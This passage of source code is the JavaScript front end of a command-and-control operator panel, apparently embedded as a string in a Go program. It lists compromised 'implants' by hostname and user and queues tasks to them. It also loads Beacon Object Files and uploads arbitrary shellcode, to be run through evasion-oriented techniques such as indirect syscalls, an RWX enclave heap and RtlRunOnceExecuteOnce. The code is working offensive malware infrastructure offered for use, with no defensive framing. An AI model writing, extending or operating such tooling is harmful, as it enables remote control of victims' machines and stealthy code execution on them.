          <span class="status ${t.status}"></span>
          ${t.type} - ${t.implant ? t.implant.hostname : 'unknown'}
        </span>
        <span class="task-time">${formatTime(t.created)}</span>
      </div>
      ${t.output ? ` + "`" + `<div class="task-output">${escapeHtml(decodeOutput(t.output))}</div>` + "`" + ` : ''}
      ${t.error ? ` + "`" + `<div class="task-output task-error">${escapeHtml(t.error)}</div>` + "`" + ` : ''}
    </div>
  ` + "`" + `).join('');
}

// toast notifications
function toast(message, type = 'info') {
  const container = document.getElementById('toastContainer');
  const t = document.createElement('div');
  t.className = 'toast ' + type;
  t.textContent = message;
  container.appendChild(t);
  setTimeout(() => {
    t.style.animation = 'slideOut 0.3s ease forwards';
    setTimeout(() => t.remove(), 300);
  }, 3000);
}

// utils
function formatTime(ts) {
  if (!ts) return '-';
  const d = new Date(ts);
  return d.toLocaleTimeString('en-US', {hour12: false});
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

function decodeOutput(b64) {
  if (!b64) return '';
  try {
    return atob(b64);
  } catch (e) {
    console.error('Failed to decode base64:', e);
    return '[decode error: ' + e.message + ']';
  }
}

// bofs
let allBOFs = [];
let selectedBOF = null;

async function loadBOFs() {
  allBOFs = await api('/bofs') || [];
  renderBOFs(allBOFs);
  updateBofImplantSelect();
}

function renderBOFs(bofs) {
  const list = document.getElementById('bofList');
  if (bofs.length === 0) {
    list.innerHTML = '<div class="empty-state">no bofs found</div>';
    return;
  }
  
  list.innerHTML = bofs.map(b => ` + "`" + `
    <div class="bof-item ${selectedBOF === b.name ? 'selected' : ''}" onclick="selectBOF('${b.name}')">
      <span class="bof-name">${b.name}</span>
      <span class="bof-size">${formatSize(b.size)}</span>
    </div>
  ` + "`" + `).join('');
}

function filterBOFs() {
  const search = document.getElementById('bofSearch').value.toLowerCase();
  const filtered = allBOFs.filter(b => b.name.toLowerCase().includes(search));
  renderBOFs(filtered);
}

function selectBOF(name) {
  selectedBOF = name;
  document.getElementById('selectedBof').value = name;
  renderBOFs(allBOFs.filter(b => {
    const search = document.getElementById('bofSearch').value.toLowerCase();
    return b.name.toLowerCase().includes(search);
  }));
}

async function updateBofImplantSelect() {
  const implants = await api('/implants') || [];
  const select = document.getElementById('bofTargetImplant');
  select.innerHTML = '<option value="">select implant...</option>' + 
    implants.filter(i => i.alive).map(i => 
      ` + "`" + `<option value="${i.id}">${i.hostname} (${i.username})</option>` + "`" + `
    ).join('');
}

async function executeBOF() {
  if (!selectedBOF) {
    toast('Please select a BOF', 'error');
    return;
  }
  
  const implantId = document.getElementById('bofTargetImplant').value;
  if (!implantId) {
    toast('Please select a target implant', 'error');
    return;
  }
  
  const bofData = await api('/bofs/' + selectedBOF);
  if (!bofData || !bofData.data) {
    toast('Failed to load BOF data', 'error');
    return;
  }
  
  const args = document.getElementById('bofArgs').value.trim();
  const taskArgs = args ? [args] : [];
  
  await fetch('/api/implants/' + implantId + '/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'bof',
      args: taskArgs,
      data: bofData.data
    })
  });
  
  document.getElementById('bofArgs').value = '';
  toast('BOF queued: ' + selectedBOF, 'success');
}

function formatSize(bytes) {
  if (bytes < 1024) return bytes + ' B';
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
  return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}

// shellcode
let shellcodeBytes = null;

async function updateShellcodeImplantSelect() {
  const implants = await api('/implants') || [];
  const select = document.getElementById('shellcodeTargetImplant');
  select.innerHTML = '<option value="">select implant...</option>' + 
    implants.filter(i => i.alive).map(i => 
      ` + "`" + `<option value="${i.id}">${i.hostname} (${i.username})</option>` + "`" + `
    ).join('');
}

function handleShellcodeFile(event) {
  const file = event.target.files[0];
  if (!file) return;
  
  const reader = new FileReader();
  reader.onload = function(e) {
    shellcodeBytes = new Uint8Array(e.target.result);
    document.getElementById('shellcodeData').value = '';
    document.getElementById('shellcodeInfo').textContent = ` + "`" + `Loaded ${file.name}: ${shellcodeBytes.length} bytes` + "`" + `;
  };
  reader.readAsArrayBuffer(file);
}

function parseShellcodeInput() {
  const input = document.getElementById('shellcodeData').value.trim();
  if (!input) return shellcodeBytes;
  
  // Try hex first (remove spaces, 0x prefixes, \x)
  let hex = input.replace(/\\x/g, '').replace(/0x/g, '').replace(/\s/g, '');
  if (/^[0-9a-fA-F]+$/.test(hex) && hex.length % 2 === 0) {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
      bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
    }
    return bytes;
  }
  
  // Try base64
  try {
    const binary = atob(input);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
      bytes[i] = binary.charCodeAt(i);
    }
    return bytes;
  } catch (e) {}
  
  return null;
}

async function executeShellcode() {
  const bytes = parseShellcodeInput();
  if (!bytes || bytes.length === 0) {
    toast('Please upload a shellcode file or paste shellcode data', 'error');
    return;
  }
  
  const implantId = document.getElementById('shellcodeTargetImplant').value;
  if (!implantId) {
    toast('Please select a target implant', 'error');
    return;
  }
  
  const method = document.getElementById('shellcodeMethod').value;
  
  // Convert to base64
  let binary = '';
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  const b64 = btoa(binary);
  
  await fetch('/api/implants/' + implantId + '/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      type: 'execute',
      args: [JSON.stringify({method: method})],
      data: b64
    })
  });
  
  toast(` + "`" + `Shellcode queued (${bytes.length} bytes, ${method})` + "`" + `, 'success');
}

// Update method description on change
document.addEventListener('DOMContentLoaded', function() {
  const methodSelect = document.getElementById('shellcodeMethod');
  if (methodSelect) {
    methodSelect.addEventListener('change', function() {
      const desc = document.getElementById('methodDesc');
      switch (this.value) {
        case 'indirect':
          desc.textContent = 'Uses NtAllocateVirtualMemory + RtlCreateUserThread via indirect syscalls';
          break;
        case 'enclave':
          desc.textContent = 'Uses mscoree.dll RWX heap + vdsutil.dll allocation + LdrCallEnclave execution';
          break;
        case 'once':
          desc.textContent = 'Uses RtlRunOnceExecuteOnce (SYNC - do NOT use shellcode that exits process!)';
          break;
      }
    });
  }
});

// enter key for login
document.getElementById('password').addEventListener('keypress', e => {
  if (e.key === 'Enter') login();
});

document.getElementById('commandArgs').addEventListener('keypress', e => {
  if (e.key === 'Enter') sendCommand();
});

// init
checkAuth();
</script>
</body>
</html>`
}

